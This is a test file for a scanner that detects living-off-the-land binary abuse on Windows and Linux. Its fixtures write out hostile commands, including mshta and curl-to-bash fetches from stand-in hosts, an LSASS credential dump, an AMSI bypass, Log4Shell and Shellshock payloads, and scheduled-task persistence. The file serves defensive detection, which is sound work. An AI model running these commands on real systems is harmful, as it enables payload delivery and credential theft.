import { describe, it, expect, beforeEach } from 'vitest'
import path from 'path'
import {
  loadLolbinCatalog,
  matchLolbinCommand,
  matchLolbinContent,
  hitsToCloudFindings,
  hitsToMalwareThreats,
  resetLolbinCatalogCache,
  getLolbinCatalogInfo,
} from './lolbin-scanner'

const CATALOG = path.resolve(__dirname, '../../../rules/security/lolbins.json')

describe('lolbin-scanner', () => {
  beforeEach(() => resetLolbinCatalogCache())

  it('loads the shipped catalog', () => {
    const info = getLolbinCatalogInfo(CATALOG)
    expect(info.ruleCount).toBeGreaterThan(50)
    expect(info.version).toMatch(/^\d+\./)
    const loaded = loadLolbinCatalog(CATALOG)
    expect(loaded.rules.every((r) => r.id && r.detectionName)).toBe(true)
    expect(loaded.rules.some((r) => r.category === 'vuln_heuristic')).toBe(true)
  })

  it('detects mshta remote script on win32 cmdline', () => {
    const hits = matchLolbinCommand(
      'C:\\Windows\\System32\\mshta.exe https://evil.example/payload.hta',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'lolbas.mshta.remote')).toBe(true)
  })

  it('detects PowerShell encoded command', () => {
    const hits = matchLolbinCommand(
      'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'lolbas.powershell.encoded')).toBe(true)
  })

  it('detects certutil decode', () => {
    const hits = matchLolbinCommand(
      'certutil.exe -urlcache -split -f http://x/a.exe %TEMP%\\a.exe',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'lolbas.certutil.decode')).toBe(true)
  })

  it('skips win32 rules on linux', () => {
    const hits = matchLolbinCommand(
      'mshta.exe https://evil.example/x.hta',
      { platform: 'linux', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'lolbas.mshta.remote')).toBe(false)
  })

  it('detects curl|bash on linux content', () => {
    const hits = matchLolbinContent(
      'curl -fsSL https://evil.example/i.sh | bash',
      'script',
      { platform: 'linux', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'linux.curl_bash_pipe')).toBe(true)
  })

  it('detects AMSI bypass technique in script content', () => {
    const hits = matchLolbinContent(
      '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")',
      'script',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'technique.amsi_bypass')).toBe(true)
  })

  it('does not flag benign powershell', () => {
    const hits = matchLolbinCommand(
      'powershell.exe -NoProfile -File C:\\Scripts\\backup.ps1',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'lolbas.powershell.encoded')).toBe(false)
    expect(hits.some((h) => h.ruleId === 'lolbas.powershell.download_cradle')).toBe(false)
  })

  it('maps hits to cloud findings and malware threats', () => {
    const hits = matchLolbinCommand(
      'mshta.exe vbscript:Execute("evil")',
      { platform: 'win32', catalogPath: CATALOG },
    )
    const findings = hitsToCloudFindings(hits)
    expect(findings[0].category).toBe('lolbin')
    const threats = hitsToMalwareThreats(hits, 'cmdline', 'mshta.exe')
    expect(threats[0].source).toBe('heuristic')
    expect(threats[0].detectionName).toContain('LOLBin')
  })

  it('detects forfiles proxy exec', () => {
    const hits = matchLolbinCommand(
      'forfiles.exe /p c:\\windows\\system32 /m notepad.exe /c "cmd /c calc.exe"',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'lolbas.forfiles.exec')).toBe(true)
  })

  it('detects LSASS dump technique', () => {
    const hits = matchLolbinCommand(
      'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\temp\\lsass.dmp full',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'technique.cred.lsass_dump')).toBe(true)
  })

  it('detects Log4Shell JNDI vuln heuristic', () => {
    const hits = matchLolbinContent(
      'User-Agent: ${jndi:ldap://evil.example/a}',
      'content',
      { platform: 'linux', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'vuln.heuristic.log4shell_jndi')).toBe(true)
    expect(hitsToCloudFindings(hits)[0].category).toBe('vuln_heuristic')
  })

  it('detects Shellshock env function', () => {
    const hits = matchLolbinContent(
      '() { :;}; /bin/bash -c "curl http://evil/x|sh"',
      'content',
      { platform: 'linux', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'vuln.heuristic.shellshock')).toBe(true)
  })

  it('detects msdt Follina-style pattern', () => {
    const hits = matchLolbinCommand(
      'msdt.exe /id PCWDiagnostic /skip true /param IT_BrowseForFile=/../../something',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'lolbas.msdt.diagcab')).toBe(true)
  })

  it('detects schtasks persistence create', () => {
    const hits = matchLolbinCommand(
      'schtasks.exe /create /tn Evil /tr C:\\Users\\Public\\a.exe /ru SYSTEM /sc onlogon',
      { platform: 'win32', catalogPath: CATALOG },
    )
    expect(hits.some((h) => h.ruleId === 'technique.persist.schtasks_create')).toBe(true)
  })
})
